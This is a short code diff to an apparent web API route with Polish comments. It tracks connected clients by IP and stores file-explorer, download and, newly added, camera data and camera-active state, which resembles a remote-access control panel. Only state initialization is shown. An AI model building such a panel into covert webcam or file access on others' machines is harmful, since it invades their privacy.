@@ -9,7 +9,7 @@ export async function POST(req: Request) {
     // Odczytywanie IP
     const ip = req.headers.get("x-forwarded-for") || "Nieznane IP";
 
-    const client = clients.get(id) || { id, ip, lastSeen: 0, messages: [], explorerData: null, downloadData: null };
+    const client = clients.get(id) || { id, ip, lastSeen: 0, messages: [], explorerData: null, downloadData: null, cameraData: null, isCameraActive: false };
     const messagesToSend = [...client.messages];
     
     client.lastSeen = Date.now();
